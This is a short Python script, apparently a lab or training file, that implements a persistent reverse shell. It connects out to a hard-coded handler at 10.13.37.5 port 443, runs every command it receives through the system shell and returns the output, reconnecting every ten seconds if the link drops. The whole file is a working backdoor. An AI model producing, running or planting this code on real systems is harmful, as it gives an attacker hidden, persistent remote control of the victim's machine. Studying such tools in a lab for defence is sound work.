import socket
import subprocess
import time

SERVER = ("10.13.37.5", 443)  # lab handler


def run(cmd):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True).stdout
    except Exception as e:
        return str(e).encode()


while True:  # reconnect loop
    try:
        s = socket.socket()
        s.connect(SERVER)

        while True:
            cmd = s.recv(4096).decode()
            if not cmd:
                break
            s.send(run(cmd))

    except Exception:
        time.sleep(10)